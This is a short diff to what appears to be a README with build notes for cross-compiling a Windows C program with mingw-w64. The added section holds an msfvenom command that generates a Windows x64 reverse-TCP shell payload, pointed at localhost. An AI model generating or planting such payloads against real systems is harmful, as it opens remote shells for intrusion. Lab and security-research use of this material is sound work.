@@ -37,3 +37,8 @@ sudo apt install mingw-w64
 ```
 x86_64-w64-mingw32-gcc win_basic_v01.c -o win_basic_v01.exe
 ```
+
+## MSFvenom
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=9090 -f c
+```
